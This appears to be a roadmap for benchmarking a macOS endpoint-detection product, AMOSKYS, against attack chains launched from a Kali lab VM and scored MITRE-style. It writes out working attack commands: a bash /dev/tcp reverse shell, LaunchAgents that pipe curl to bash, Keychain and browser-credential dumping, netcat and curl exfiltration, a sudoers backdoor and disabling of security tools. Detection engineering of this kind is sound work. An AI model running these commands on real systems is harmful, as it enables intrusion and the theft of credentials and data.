# AMOSKYS Adversary Benchmark Roadmap

**Goal:** Prove AMOSKYS detects real attacks from a real adversary (Kali Linux) against a real target (your Mac), with measurable results that stand next to CrowdStrike Falcon.

**Method:** MITRE ATT&CK Evaluations style — run known attack chains, measure detection at every step, score with the same methodology the industry uses to rank EDR vendors.

---

## The Scoring Framework

Every attack step gets one of four verdicts (same as MITRE Evaluations):

| Verdict | Meaning | Points |
|---------|---------|--------|
| **Detect** | Probe fired, correct MITRE technique, alert raised | 3 |
| **Telemetry** | Event recorded in correct table, queryable, but no alert | 2 |
| **Enrich** | Event recorded with additional context (genealogy, geo, ASN) | 2.5 |
| **Miss** | No evidence the step occurred | 0 |

**Detection Rate = (Detect + Telemetry + Enrich) / Total Steps**

CrowdStrike scored 99.3% detection in MITRE Evals Round 5 (Turla). Your target: **>90% detection on the attack chains below.** That's competitive with the top 5 EDR vendors.

---

## Phase 1: Local Attack Simulation (No Kali Required)

**Timeline: Week 1**
**Purpose:** Establish baseline detection rate using the existing `attack_simulation.py` and redteam harness before introducing network attacks.

### 1A. Run the Existing Simulation Suite

```bash
# Start AMOSKYS full stack
PYTHONPATH=src FLASK_PORT=5003 LOGIN_DISABLED=true python -m web.app &

# Run attack simulation (plants real artifacts on disk)
python scripts/attack_simulation.py

# Collect and score
python scripts/collect_and_store.py

# Check what AMOSKYS caught
curl http://127.0.0.1:5003/api/incidents/list | python -m json.tool
curl http://127.0.0.1:5003/api/telemetry/recent?limit=100 | python -m json.tool
```

### 1B. Run Red-Team Scenarios

```bash
# List available scenarios
PYTHONPATH=src python -m amoskys.redteam.cli list

# Run credential dump (8-phase infostealer kill chain)
PYTHONPATH=src python -m amoskys.redteam.cli run credential_dump --report

# Run all scenarios and score
PYTHONPATH=src python -m amoskys.redteam.cli run all --report
```

### 1C. Measure Baseline

Record these metrics before adding network attacks:

| Metric | How to Measure |
|--------|---------------|
| Probes fired | `query_security_events(hours=1)` count |
| Incidents created | `list_incidents()` count |
| MITRE techniques detected | `get_mitre_coverage()` unique count |
| False positive rate | Manual review — how many alerts are wrong? |
| Receipt ledger completeness | `receipt_reconcile()` — any gaps? |
| Genealogy depth | `get_spawn_chain()` on flagged PIDs |

---

## Phase 2: Kali Linux Network Attacks

**Timeline: Weeks 2-3**
**Purpose:** Real adversary traffic from Kali hitting AMOSKYS's network, DNS, and auth agents.

### Lab Setup

```
┌─────────────────┐  VMware NAT  ┌─────────────────┐
│   Kali Linux    │   bridge101  │   Your Mac      │
│   (Attacker)    │◄────────────►│   (AMOSKYS)     │
│  GhostOps       │              │                 │
│  192.168.237.132│              │  192.168.237.1  │  ← VMware bridge
│                 │              │  192.168.2.215  │  ← LAN (en0)
│  Tools:         │              │                 │
│  - nmap         │              │  Running:       │
│  - metasploit   │              │  - 17 agents    │
│  - hydra        │              │  - EventBus     │
│  - responder    │              │  - Dashboard    │
│  - empire       │              │  - IGRIS        │
│                 │              │  - SOMA Brain   │
└─────────────────┘              └─────────────────┘
```

**Option A:** Kali VM on the same Mac (VMware/UTM/Parallels)
**Option B:** Kali on separate hardware, same network
**Option C:** Kali via Docker (`docker run -it kalilinux/kali-rolling`)

### SSH Into Kali from Mac

```bash
# 1. Find Kali's IP (run ON Kali, or scan from Mac)
#    On Kali:
ip addr show | grep inet
#    Or from Mac:
nmap -sn 192.168.237.0/24 | grep -B2 "Kali\|linux"

# 2. Ensure SSH is running on Kali
#    On Kali:
sudo systemctl enable ssh
sudo systemctl start ssh
sudo systemctl status ssh   # Should show "active (running)"

# 3. SSH into Kali FROM your Mac
ssh kali@<KALI_IP>
# Default creds: kali / kali (change after first login)
# Example:
ssh kali@192.168.237.132

# 4. (Optional) Set up key-based auth for convenience
ssh-keygen -t ed25519 -f ~/.ssh/kali_lab -N ""
ssh-copy-id -i ~/.ssh/kali_lab kali@<KALI_IP>
# Then: ssh -i ~/.ssh/kali_lab kali@<KALI_IP>

# 5. (Optional) Add to ~/.ssh/config for quick access
cat >> ~/.ssh/config << 'EOF'
Host kali
    HostName <KALI_IP>
    User kali
    IdentityFile ~/.ssh/kali_lab
    StrictHostKeyChecking no
EOF
# Then just: ssh kali
```

### SSH Into Mac from Kali (for attack chains)

```bash
# 1. Enable Remote Login on your Mac
sudo systemsetup -setremotelogin on

# 2. Create a test account for the attacker (weak creds on purpose)
sudo dscl . -create /Users/testattacker
sudo dscl . -create /Users/testattacker UserShell /bin/zsh
sudo dscl . -passwd /Users/testattacker "WeakPassword123"
sudo dscl . -create /Users/testattacker UniqueID 502
sudo dscl . -create /Users/testattacker PrimaryGroupID 20
sudo dscl . -create /Users/testattacker NFSHomeDirectory /Users/testattacker
sudo createhomedir -c -u testattacker

# 3. Verify from Kali
ssh testattacker@192.168.237.1
# Password: WeakPassword123

# 4. IMPORTANT: After benchmarking, clean up
sudo dscl . -delete /Users/testattacker
sudo rm -rf /Users/testattacker
sudo systemsetup -setremotelogin off
```

### Verify Bidirectional Connectivity

```bash
# From Mac → Kali
ping <KALI_IP>
ssh kali@<KALI_IP> "whoami && uname -a"

# From Kali → Mac
ping 192.168.237.1
ssh testattacker@192.168.237.1 "whoami && sw_vers"

# Both should succeed. If not, check:
# - Same subnet (192.168.237.x)?
# - Firewall blocking? (sudo pfctl -d to disable temporarily)
# - SSH enabled on both sides?
```

### Quick-Start: Run Attack Chain from Kali

```bash
# SSH into Kali
ssh kali

# Install tools (first time only)
sudo apt update && sudo apt install -y nmap hydra netcat-openbsd dnsutils iodine

# Verify target is reachable
nmap -sV -p 22 192.168.237.1

# Ready to run attack chains below
```

### Attack Chain 1: SSH Brute Force + Persistence (T1110 + T1543)

**What CrowdStrike detects:** Failed SSH attempts, successful auth, LaunchAgent drop.

**From Kali:**
```bash
# Step 1: Reconnaissance (T1046)
nmap -sV -p 22,80,443,5003,8080 192.168.237.1

# Step 2: SSH Brute Force (T1110.001)
hydra -l testattacker -P /usr/share/wordlists/rockyou.txt ssh://192.168.237.1 -t 4

# Step 3: SSH Login with known creds (T1078)
ssh testattacker@192.168.237.1

# Step 4: Once inside — Plant LaunchAgent persistence (T1543.001)
cat > ~/Library/LaunchAgents/com.update.check.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.update.check</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl http://192.168.237.100:8080/beacon.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
EOF

# Step 5: Credential access — dump Keychain paths (T1555.001)
security list-keychains
ls -la ~/Library/Keychains/

# Step 6: Exfiltration — send data back to Kali (T1041)
tar czf /tmp/.exfil.tar.gz ~/Documents/sensitive/ 2>/dev/null
curl -X POST http://192.168.237.100:8080/upload -F "file=@/tmp/.exfil.tar.gz"
```

**AMOSKYS should detect at every step:**

| Step | MITRE | Agent | Detection |
|------|-------|-------|-----------|
| nmap scan | T1046 | Network, NetworkSentinel | Port scan probe, rate anomaly |
| hydra brute force | T1110.001 | Auth, ProtocolCollector | SSH brute force probe (>5 failures) |
| SSH login | T1078 | Auth | Successful auth after failures |
| LaunchAgent drop | T1543.001 | Persistence, RealtimeSensor | Baseline-diff + FSEvents |
| Keychain access | T1555.001 | InfostealerGuard | Keychain access probe |
| Data exfil | T1041 | Network | Exfil spike, tactical watch from InfostealerGuard |
| **Fusion** | Multi-tactic | FusionEngine | `rule_multi_tactic_attack` + `rule_credential_harvest_exfil` |

**Scorecard target: 7/7 steps detected = 100%**

### Attack Chain 2: Reverse Shell + Discovery + Lateral Movement

**From Kali:**
```bash
# Step 1: Start listener on Kali
nc -lvnp 4444

# Step 2: On Mac (simulating initial access via phishing payload)
# Plant a script that the user might "click"
cat > /tmp/update_helper.sh << 'EOF'
#!/bin/bash
# Reverse shell (T1059.004)
/bin/bash -i >& /dev/tcp/192.168.237.100/4444 0>&1
EOF
chmod +x /tmp/update_helper.sh
/tmp/update_helper.sh &

# Step 3: From reverse shell — Discovery (T1082, T1016, T1018)
whoami
id
sw_vers
ifconfig
arp -a
networksetup -listallhardwareports

# Step 4: Process discovery (T1057)
ps aux | grep -i security
ps aux | grep -i sentinel

# Step 5: Enumerate credentials (T1555.003)
find ~/Library/Application\ Support -name "Login Data" 2>/dev/null
find ~/Library/Application\ Support -name "Cookies" 2>/dev/null

# Step 6: Stage for exfil (T1560.001)
zip /tmp/.staging.zip ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data 2>/dev/null

# Step 7: Exfil over the reverse shell (T1041)
cat /tmp/.staging.zip | nc 192.168.237.100 4445
```

**AMOSKYS detection map:**

| Step | MITRE | Agent | Detection |
|------|-------|-------|-----------|
| Script in /tmp | T1059.004 | Process, RealtimeSensor | TempExecution probe, BinaryFromTemp |
| Reverse shell | T1059.004 | Network, Process | Outbound to non-standard port, bash -i pattern |
| Discovery cmds | T1082, T1016 | Process, Correlation | LOLBin abuse, discovery sequence |
| Credential enum | T1555.003 | InfostealerGuard | Browser credential store access |
| Archive staging | T1560.001 | InfostealerGuard, FIM | Credential archive probe |
| Exfil over nc | T1041 | Network | Non-standard port, exfil spike |
| **Tactical bus** | — | All peers | WATCH_PID from InfostealerGuard → Network+DNS focus |
| **Genealogy** | — | Process | `bash → update_helper.sh → nc` spawn chain |
| **Fusion** | Multi-tactic | FusionEngine | `rule_download_execute_persist` or `rule_infostealer_kill_chain` |

**Scorecard target: 7/7 steps + 3 enrichments = 10/10**

### Attack Chain 3: DNS Tunneling + C2 Beaconing

**From Kali (set up DNS tunnel server):**
```bash
# Install iodine for DNS tunneling
apt-get install iodine

# Start iodine server (T1071.004)
sudo iodined -f -c -P secretpassword 10.1.0.1 tunnel.yourdomain.com

# Or simpler: dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
ruby dnscat2.rb tunnel.yourdomain.com
```

**From Mac (simulating compromised host):**
```bash
# DNS tunneling client (T1071.004)
sudo iodine -f -P secretpassword tunnel.yourdomain.com

# Or simulate DGA beaconing (T1568.002)
for i in $(seq 1 100); do
    DOMAIN=$(cat /dev/urandom | LC_ALL=C tr -dc 'a-z0-9' | fold -w 16 | head -n 1).com
    dig $DOMAIN +short 2>/dev/null
    sleep 2
done

# Simulate C2 beacon pattern (T1071.001)
while true; do
    curl -s http://192.168.237.100:8080/beacon?id=$(hostname) -o /dev/null
    sleep $((RANDOM % 10 + 25))  # ~30s jitter
done
```

**AMOSKYS detection map:**

| Step | MITRE | Agent | Detection |
|------|-------|-------|-----------|
| DNS tunneling | T1071.004 | DNS | DNSTunneling probe (long labels, TXT floods) |
| DGA domains | T1568.002 | DNS | DGA probe (entropy + n-gram analysis) |
| C2 beaconing | T1071.001 | DNS, Network | Beaconing probe (periodic patterns) |
| HTTP beacon | T1071.001 | HTTPInspector, Network | C2WebChannel probe |
| **Sigma** | T1071.004 | Detection engine | `dns_tunneling.yml`, `dns_beaconing.yml` |

### Attack Chain 4: Privilege Escalation + Defense Evasion

**From Mac (post-compromise):**
```bash
# Step 1: Check SIP status (T1518)
csrutil status

# Step 2: Attempt sudo abuse (T1548.003)
sudo -l  # Check what we can run
echo "testattacker ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor

# Step 3: Disable security tools (T1562.001)
sudo spctl --master-disable  # Disable Gatekeeper
sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0  # Disable firewall

# Step 4: Create hidden file (T1564.001)
cp /bin/bash /tmp/.hidden_shell
chmod +x /tmp/.hidden_shell
xattr -d com.apple.quarantine /tmp/.hidden_shell 2>/dev/null

# Step 5: Timestomp (T1070.006)
touch -t 202001010000 /tmp/.hidden_shell

# Step 6: Log tampering (T1070.002)
sudo log erase --all 2>/dev/null  # Will likely fail but attempt is logged
```

### Attack Chain 5: Full Kill Chain (AMOS Stealer Simulation)

This is the crown jewel — simulates the real AMOS/Atomic Stealer malware family that's actively targeting macOS in 2025-2026.

**From Kali (C2 server):**
```bash
# Start HTTP server for payload delivery and exfil
python3 -m http.server 8080 &

# Start listener for stolen data
nc -lvnp 4445 > stolen_data.tar.gz &
```

**From Mac (simulating user clicking phishing link):**
```bash
# Phase 1: Initial access — download from "CDN" (T1189, T1204)
curl -o /tmp/ChromeUpdate.dmg http://192.168.237.100:8080/payload.dmg
# (In reality this is just an empty file — we're testing detection not exploitation)

# Phase 2: Execution from temp (T1204, T1059.004)
cat > /tmp/install.sh << 'SCRIPT'
#!/bin/bash
# Phase 3: Persistence — LaunchAgent (T1543.001)
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.chrome.updater.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.chrome.updater</string>
    <key>ProgramArguments</key>
    <array><string>/bin/bash</string><string>-c</string>
    <string>while true; do curl -s http://192.168.237.100:8080/tasks | bash; sleep 300; done</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
PLIST

# Phase 4: Credential theft — Keychain (T1555.001)
security dump-keychain -d login.keychain-db 2>/dev/null > /tmp/.kc_dump

# Phase 5: Browser credentials (T1555.003)
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/.chrome_logins 2>/dev/null
cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/.chrome_cookies 2>/dev/null

# Phase 6: Crypto wallets (T1005)
find ~/Library/Application\ Support -name "*.wallet" -o -name "wallet.dat" 2>/dev/null | \
    xargs -I{} cp {} /tmp/.wallets/ 2>/dev/null

# Phase 7: Session cookies (T1539)
cp ~/Library/Cookies/Cookies.binarycookies /tmp/.safari_cookies 2>/dev/null

# Phase 8: Archive + Exfil (T1560.001 + T1041)
tar czf /tmp/.loot.tar.gz /tmp/.kc_dump /tmp/.chrome_* /tmp/.safari_cookies /tmp/.wallets 2>/dev/null
curl -X POST http://192.168.237.100:8080/exfil -F "data=@/tmp/.loot.tar.gz"

# Cleanup traces (T1070.004)
rm -f /tmp/.kc_dump /tmp/.chrome_* /tmp/.safari_cookies /tmp/.loot.tar.gz
SCRIPT

chmod +x /tmp/install.sh
/tmp/install.sh
```

**Complete detection scorecard for Chain 5:**

| Phase | Step | MITRE | Expected Detection | Agent(s) |
|-------|------|-------|--------------------|----------|
| 1 | Download to /tmp | T1204 | OBSERVATION (flow) + QuarantineGuard | Network, Quarantine |
| 2 | Execute from /tmp | T1059.004 | TempExecution probe | Process, RealtimeSensor |
| 3 | LaunchAgent drop | T1543.001 | LaunchAgent baseline-diff + FSEvents | Persistence, Realtime |
| 4 | Keychain dump | T1555.001 | Keychain access probe | InfostealerGuard |
| 5 | Browser creds | T1555.003 | Browser credential theft probe | InfostealerGuard |
| 6 | Wallet access | T1005 | Crypto wallet theft probe | InfostealerGuard |
| 7 | Cookie theft | T1539 | Session cookie theft probe | InfostealerGuard |
| 8a | Archive | T1560.001 | Credential archive probe | InfostealerGuard |
| 8b | HTTP exfil | T1041 | Exfil spike + C2 beacon | Network |
| 9 | File cleanup | T1070.004 | FIM deletion events | Filesystem |
| **Tactical** | WATCH_PID | — | InfostealerGuard → Network/DNS/Process | All peers |
| **Genealogy** | Spawn chain | — | `/tmp/install.sh → security → tar → curl` | Process |
| **Fusion** | Kill chain | — | `rule_infostealer_kill_chain` + `rule_credential_harvest_exfil` | FusionEngine |
| **Incident** | Context | — | `incident_context_json` materialized | FusionEngine |

**Scorecard target: 10/10 steps detected + 4 enrichments**

---

## Phase 3: Benchmark Script

**Timeline: Week 3**
**Purpose:** Automated scoring that runs the attack chains and produces a CrowdStrike-comparable scorecard.

Build a script `scripts/benchmark.py` that:

1. **Starts AMOSKYS** (launcher + agents + dashboard)
2. **Runs each attack chain** (local simulation first, then live Kali)
3. **Collects for 60 seconds** after each chain
4. **Queries the detection results** via IGRIS tools or API
5. **Scores each step** as Detect / Telemetry / Enrich / Miss
6. **Produces a scorecard** in Markdown and JSON

The scorecard format:

```
AMOSKYS Adversary Benchmark — v0.9.0-beta.1
Date: 2026-03-17
Target: macOS 15.x (Apple Silicon)

Chain 1: SSH Brute Force + Persistence
  [DETECT]    T1046  Port scan                    NetworkSentinel
  [DETECT]    T1110  SSH brute force              Auth + ProtocolCollector
  [DETECT]    T1078  Successful SSH auth          Auth
  [DETECT]    T1543  LaunchAgent persistence      Persistence + RealtimeSensor
  [DETECT]    T1555  Keychain access              InfostealerGuard
  [DETECT]    T1041  Data exfiltration            Network
  [ENRICH]    ---    Tactical WATCH_PID           CoordinationBus
  Score: 6/6 Detect + 1 Enrich = 100%

Chain 2: Reverse Shell + Discovery
  ...

OVERALL: 38/42 steps detected (90.5%)
  Detect:    32 (76.2%)
  Telemetry:  4 (9.5%)
  Enrich:     2 (4.8%)
  Miss:       4 (9.5%)

vs. CrowdStrike Falcon MITRE Eval Round 5: 99.3%
vs. AMOSKYS v0.9.0-beta.1: 90.5% (target: >90%)
```

---

## Phase 4: Close the Gaps

**Timeline: Weeks 4-6**
**Purpose:** Fix every Miss, promote Telemetry to Detect.

### Expected Gaps and Fixes

| Gap | Root Cause | Fix |
|-----|-----------|-----|
| Reverse shell not detected | No outbound bash -i pattern matching | Add `ReverseShellProbe` to Network agent |
| `nmap` SYN scan missed | Only ESTABLISHED connections captured | Add SYN-only connection monitoring |
| Timestomp not detected | FIM doesn't track mtime regression | Add `TimestompProbe` to Filesystem agent |
| Sudo backdoor missed | No `/etc/sudoers.d/` monitoring | Add sudoers path to Persistence agent |
| Gatekeeper disable missed | No `spctl` command monitoring | Add to UnifiedLog agent probes |
| Log erase attempt missed | `log erase` command not in LOLBin list | Add `log` to LOLBin watchlist |

### New Probes Needed

1. **ReverseShellProbe** — detect `bash -i >& /dev/tcp/` patterns in process cmdlines
2. **SudoersBackdoorProbe** — monitor `/etc/sudoers.d/` for new files
3. **SecurityToolDisableProbe** — detect `spctl --master-disable`, `csrutil disable`, firewall off
4. **TimestompProbe** — detect mtime set to unrealistic past dates
5. **SYNFloodProbe** — detect high rate of half-open connections (nmap SYN scan)

---

## Phase 5: Head-to-Head with CrowdStrike

**Timeline: Week 6+**
**Purpose:** Run the same attacks with CrowdStrike Falcon on the same Mac, compare side-by-side.

### Setup

1. Install CrowdStrike Falcon sensor on your Mac (free trial or academic license)
2. Run AMOSKYS alongside CrowdStrike (both active simultaneously)
3. Execute each attack chain from Kali
4. Compare what each platform detected

### Comparison Matrix

For each attack step, record:

| Step | MITRE | CrowdStrike | AMOSKYS | Winner |
|------|-------|-------------|---------|--------|
| Port scan | T1046 | Telemetry | Detect | AMOSKYS |
| SSH brute | T1110 | Detect | Detect | Tie |
| LaunchAgent | T1543 | Detect | Detect | Tie |
| Keychain | T1555 | Detect | Detect | Tie |
| DNS tunnel | T1071.004 | Telemetry | Detect | AMOSKYS |
| Spawn chain | — | Yes (full) | Yes (genealogy) | Tie |
| AI analyst | — | Charlotte AI | IGRIS | Compare |

### Where AMOSKYS Can Win

CrowdStrike excels at kernel-level visibility (kext/sext), cloud-scale threat intel, and managed response. AMOSKYS can differentiate on:

1. **Transparency** — Every detection is explainable. IGRIS shows the spawn chain, the MITRE technique, the probe that fired, and why. CrowdStrike is a black box.

2. **Tactical coordination** — The WATCH_PID lateral bus means agents actively hunt together. CrowdStrike agents don't have this.

3. **Receipt ledger** — AMOSKYS can prove it didn't lose events. CrowdStrike can't (you trust their cloud).

4. **Process genealogy** — Durable spawn chains that survive process exit with one query.

5. **On-device AI** — IGRIS reasons locally. CrowdStrike Charlotte AI requires cloud.

6. **Customizability** — You can write new probes in 30 minutes. CrowdStrike: wait for an update.

---

## Phase 6: Atomic Red Team Integration

**Timeline: Ongoing**
**Purpose:** Systematic technique-by-technique coverage testing using the open-source Atomic Red Team framework.

### Setup

```bash
# On your Mac — install Atomic Red Team
git clone https://github.com/redcanaryco/atomic-red-team.git ~/atomic-red-team

# Install invoke-atomicredteam (PowerShell)
brew install --cask powershell
pwsh -c "Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force"

# Or use the bash-based runner
pip install art  # Atomic Red Team Python runner
```

### Priority Techniques to Test

These are the techniques AMOSKYS claims to detect. Verify each one:

**Tier 1 — Must detect (core value prop):**
```bash
# T1543.001 — Launch Agent
art run T1543.001

# T1555.001 — Keychain
art run T1555.001

# T1555.003 — Browser Credentials
art run T1555.003

# T1059.004 — Unix Shell
art run T1059.004

# T1053.003 — Cron
art run T1053.003

# T1070.002 — Log Clearing
art run T1070.002

# T1071.004 — DNS Tunneling (manual — needs DNS server)
```

**Tier 2 — Should detect (competitive edge):**
```bash
# T1056.002 — GUI Input Capture (osascript)
art run T1056.002

# T1548.001 — SUID
art run T1548.001

# T1564.001 — Hidden Files
art run T1564.001

# T1036 — Masquerading
art run T1036

# T1046 — Network Scanning
art run T1046
```

**Tier 3 — Stretch goals:**
```bash
# T1574.006 — DYLD Hijacking
art run T1574.006

# T1547.015 — Login Items
art run T1547.015

# T1553.001 — Gatekeeper Bypass
art run T1553.001
```

### Per-Technique Test Protocol

For each technique:

1. **Clear state:** `python scripts/collect_and_store.py --clear`
2. **Run atomic:** `art run T1543.001`
3. **Wait 30 seconds** (polling interval)
4. **Collect:** `python scripts/collect_and_store.py`
5. **Query:** `curl http://127.0.0.1:5003/api/telemetry/recent?limit=50`
6. **Score:** Did the correct probe fire? Correct MITRE technique? Correct severity?
7. **Record:** Add to the technique scorecard

---

## Deliverables Checklist

| # | Deliverable | Status |
|---|-------------|--------|
| 1 | Lab setup (Kali VM + test account on Mac) | TODO |
| 2 | Run existing attack_simulation.py + baseline metrics | TODO |
| 3 | Execute Attack Chain 1 (SSH brute + persistence) | TODO |
| 4 | Execute Attack Chain 2 (Reverse shell + discovery) | TODO |
| 5 | Execute Attack Chain 3 (DNS tunneling + C2) | TODO |
| 6 | Execute Attack Chain 4 (Privesc + defense evasion) | TODO |
| 7 | Execute Attack Chain 5 (Full AMOS stealer simulation) | TODO |
| 8 | Build `scripts/benchmark.py` automated scorer | TODO |
| 9 | Fix all Misses — new probes for gaps | TODO |
| 10 | Re-run benchmark — target >90% detection | TODO |
| 11 | Atomic Red Team per-technique validation | TODO |
| 12 | CrowdStrike head-to-head comparison | TODO |
| 13 | Publish benchmark results as evidence | TODO |

---

## Success Criteria

AMOSKYS is competitive with top-tier EDR when:

- **>90% detection rate** across all 5 attack chains
- **<5% false positive rate** on normal Mac usage
- **Receipt ledger shows 0 gaps** — no lost events
- **Every incident has a materialized context** — one-query forensics
- **Every flagged PID has a spawn chain** — genealogy works
- **Tactical bus activates** — WATCH_PID flows from InfostealerGuard to peers
- **IGRIS can narrate the attack** — "Here's what happened, in order, with evidence"
- **Detection latency <15 seconds** for polling agents, <2 seconds for realtime sensor

The benchmark results ARE the product pitch. Let them speak.
